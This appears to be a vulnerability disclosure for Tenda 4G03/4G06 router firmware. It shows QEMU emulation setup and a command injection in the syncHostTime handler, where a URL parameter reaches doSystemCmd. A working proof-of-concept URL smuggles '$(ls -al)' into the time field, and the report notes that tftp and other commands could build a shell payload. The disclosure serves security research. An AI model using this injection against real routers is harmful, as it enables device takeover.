# tenda_4g03-4g06_vuln
vuln__firm_version 
4g03 <= V16.03.07.21_multi
4g03 <= V16.03.07.21_multi

# Vulnerability Reproduction
Firmware example ：
https://down.tendacn.com/uploadfile/4G03/US_4G03V1.0re_V16.03.07.21_multi_TDE01.zip

## system emulate:
## Host
sudo brctl addbr br0
sudo ifconfig br0 192.168.1.137/24 up
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.1.138/24 up
sudo brctl addif br0 tap0

## Guest
ip link add br0 type dummy
ifconfig eth0 192.168.1.139/24 up
ifconfig br0 192.168.1.140/24 up

## Mount file system
mount -o bind /dev ./squashfs-root/dev/
mount -t proc /proc/ ./squashfs-root/proc/
chroot squashfs-root /bin/sh

# Emulation
sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic

# Vulnerability information
![image](https://github.com/user-attachments/assets/33559806-3b51-4215-96f5-0ccb4eee08cd)

Pass the URL parameters to var, control var, and then execute the corresponding system function through doSystemCmd.

## after emulate successed
run ./bin/httpd 

![image](https://github.com/user-attachments/assets/7a584e9a-0ac2-4bf9-9d61-6ed739434c99)

## browser access
http://192.168.1.140/goform/syncHostTime/js/libs/reasy-ui-1.0.3.js?time=$(ls%20-al)

you can see it in the simulation terminal

![image](https://github.com/user-attachments/assets/725fa838-9d72-4f69-a5a9-9c2b105b3754)

After testing, not only can execute 'ls'. Can also execute 'echo', 'cat', 'tftp' and other commands that can be used to construct payloads to obtain shell commands
